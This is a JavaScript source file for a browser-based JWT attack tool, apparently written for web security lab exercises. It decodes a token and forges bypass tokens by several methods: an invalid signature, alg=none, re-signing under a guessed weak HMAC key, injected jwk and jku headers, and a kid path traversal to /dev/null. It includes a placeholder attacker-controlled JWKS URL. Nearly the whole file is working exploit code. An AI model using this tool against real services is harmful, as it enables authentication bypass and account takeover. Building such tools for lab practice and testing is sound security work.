const sourceToken = document.getElementById('sourceToken');
const reloadBtn = document.getElementById('reloadBtn');
const decodeError = document.getElementById('decodeError');
const headerOut = document.getElementById('headerOut');
const payloadOut = document.getElementById('payloadOut');
const payloadEditor = document.getElementById('payloadEditor');
const attackInputSection = document.getElementById('attackInputSection');
const extraInputLabel = document.getElementById('extraInputLabel');
const extraInput = document.getElementById('extraInput');
const extraInputHelp = document.getElementById('extraInputHelp');
const generateBtn = document.getElementById('generateBtn');
const resultToken = document.getElementById('resultToken');
const attackNotes = document.getElementById('attackNotes');
const copyBtn = document.getElementById('copyBtn');

let selectedAttack = 'unverified-signature';

sourceToken.value = localStorage.getItem('jwt.source') || '';
if (sourceToken.value) decodeJwt();

reloadBtn.addEventListener('click', decodeJwt);

for (const btn of document.querySelectorAll('[data-attack]')) {
  btn.addEventListener('click', () => {
    selectedAttack = btn.dataset.attack;
    for (const b of document.querySelectorAll('[data-attack]')) {
      b.classList.toggle('secondary', b !== btn);
    }
    configureInputForAttack(selectedAttack);
    attackNotes.textContent = getPresetHint(selectedAttack);
  });
}

configureInputForAttack(selectedAttack);

generateBtn.addEventListener('click', async () => {
  try {
    decodeError.textContent = '';
    const token = sourceToken.value.trim();
    const [headerB64, , signatureB64] = token.split('.');
    const baseHeader = parsePart(headerB64);
    const payload = JSON.parse(payloadEditor.value);

    let nextHeader = { ...baseHeader };
    let nextSig = signatureB64 || '';
    let notes = [];

    if (selectedAttack === 'unverified-signature') {
      nextSig = 'tampered-signature';
      notes = [
        'Lab: JWT authentication bypass via unverified signature.',
        'Payload is modified but signature is intentionally invalid.',
        'If accepted, target is not validating signatures.',
      ];
    }

    if (selectedAttack === 'flawed-signature') {
      nextHeader.alg = 'none';
      nextSig = '';
      notes = [
        'Lab: JWT authentication bypass via flawed signature verification.',
        'Sets header alg to none and removes signature.',
        'If accepted, server likely trusts client-supplied algorithm.',
      ];
    }

    if (selectedAttack === 'weak-signing-key') {
      const secret = requireInput('Please enter the signing key/secret for this attack.');
      nextHeader.alg = 'HS256';
      const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
      nextSig = await hmacSha256Base64url(signingInput, secret);
      resultToken.value = `${signingInput}.${nextSig}`;
      attackNotes.textContent = [
        'Lab: JWT authentication bypass via weak signing key.',
        `Signed with supplied secret: "${secret}".`,
      ].join('\n');
      return;
    }

    if (selectedAttack === 'jwk-header-injection') {
      nextHeader.alg = 'RS256';
      const publicJwk = readJsonInput(
        '{"kty":"RSA","e":"AQAB","n":"<public modulus>"}',
        'Provide a public JWK JSON for jwk injection.',
      );
      nextHeader.jwk = publicJwk;

      nextSig = '<provide-privateJwk-to-sign>';
      notes.unshift(
        'Lab: JWT authentication bypass via jwk header injection.',
        'Injected public key from user input into jwk header.',
        'Sign the token with matching private key in your tooling (Burp/openssl/script).',
      );
    }

    if (selectedAttack === 'jku-header-injection') {
      nextHeader.alg = 'RS256';
      const jku = requireInput('Please provide attacker JWKS URL (jku).');
      nextHeader.jku = jku;
      nextHeader.kid = 'attacker-key-1';

      nextSig = '<sign-with-private-key-for-jwks-key>';
      notes.unshift(
        'Lab: JWT authentication bypass via jku header injection.',
        `Uses user-supplied jku: ${jku}`,
        'Set kid and sign with the private key matching your hosted JWKS.',
      );
    }

    if (selectedAttack === 'kid-path-traversal') {
      nextHeader.alg = 'HS256';
      nextHeader.kid = '../../../../../../../dev/null';
      const secret = requireInput('Provide signing key for this check (empty string allowed as "").');
      const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
      nextSig = await hmacSha256Base64url(signingInput, secret);
      resultToken.value = `${signingInput}.${nextSig}`;
      attackNotes.textContent = [
        'Lab: JWT authentication bypass via kid header path traversal.',
        'kid points to /dev/null traversal path.',
        `Token signed with supplied key value: "${secret}".`,
      ].join('\n');
      return;
    }

    const finalToken = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}.${nextSig}`;
    resultToken.value = finalToken;
    attackNotes.textContent = notes.join('\n') || 'No notes.';
  } catch (err) {
    decodeError.textContent = `Generation error: ${err.message}`;
  }
});

copyBtn.addEventListener('click', async () => {
  await navigator.clipboard.writeText(resultToken.value);
  attackNotes.textContent += '\nCopied to clipboard.';
});

function configureInputForAttack(key) {
  if (key === 'weak-signing-key') {
    showInput('Weak key / secret', 'secret1', 'Required: enter the candidate HMAC secret.');
    return;
  }

  if (key === 'jwk-header-injection') {
    showInput('Public JWK JSON', '{"kty":"RSA","e":"AQAB","n":"..."}', 'Required: paste public JWK JSON to inject into header.');
    return;
  }

  if (key === 'jku-header-injection') {
    showInput('JKU URL', 'https://attacker.example/jwks.json', 'Required: URL to attacker-controlled JWKS endpoint.');
    return;
  }

  if (key === 'kid-path-traversal') {
    showInput('Signing key', '', 'Required: key used to sign crafted token (use "" to test empty key).');
    return;
  }

  attackInputSection.classList.add('hidden');
  extraInput.value = '';
}

function showInput(label, placeholder, helpText) {
  attackInputSection.classList.remove('hidden');
  extraInputLabel.textContent = label;
  extraInput.placeholder = placeholder;
  extraInputHelp.textContent = helpText;
}

function requireInput(message) {
  const value = extraInput.value;
  if (value === '') throw new Error(message);
  return value;
}

function readJsonInput(example, errorMessage) {
  const raw = requireInput(errorMessage);
  try {
    return JSON.parse(raw);
  } catch {
    throw new Error(`Invalid JSON input. Example: ${example}`);
  }
}

function getPresetHint(key) {
  const hints = {
    'unverified-signature': 'Generates token with invalid signature for signature-validation bypass checks.',
    'flawed-signature': 'Generates alg=none token with empty signature.',
    'weak-signing-key': 'Requires user-provided key/secret.',
    'jwk-header-injection': 'Requires user-provided public JWK JSON.',
    'jku-header-injection': 'Requires user-provided JKU URL.',
    'kid-path-traversal': 'Requires user-provided signing key.',
  };

  return hints[key] || 'Choose preset and generate.';
}

function decodeJwt() {
  decodeError.textContent = '';
  try {
    const token = sourceToken.value.trim();
    if (!token || token.split('.').length !== 3) {
      throw new Error('JWT must have 3 parts.');
    }

    const [headerB64, payloadB64] = token.split('.');
    const header = parsePart(headerB64);
    const payload = parsePart(payloadB64);

    headerOut.textContent = JSON.stringify(header, null, 2);
    payloadOut.textContent = JSON.stringify(payload, null, 2);
    payloadEditor.value = JSON.stringify(payload, null, 2);
    localStorage.setItem('jwt.source', token);
  } catch (err) {
    decodeError.textContent = `Decode error: ${err.message}`;
  }
}

function parsePart(part) {
  const json = atob(base64urlToBase64(part));
  return JSON.parse(json);
}

function base64urlJson(obj) {
  return base64ToBase64url(btoa(JSON.stringify(obj)));
}

function base64urlToBase64(input) {
  const pad = '='.repeat((4 - (input.length % 4 || 4)) % 4);
  return (input + pad).replace(/-/g, '+').replace(/_/g, '/');
}

function base64ToBase64url(input) {
  return input.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
}

async function hmacSha256Base64url(message, secret) {
  const key = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(secret),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign'],
  );

  const signature = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(message));
  const bytes = new Uint8Array(signature);
  let binary = '';
  for (const b of bytes) binary += String.fromCharCode(b);
  return base64ToBase64url(btoa(binary));
}
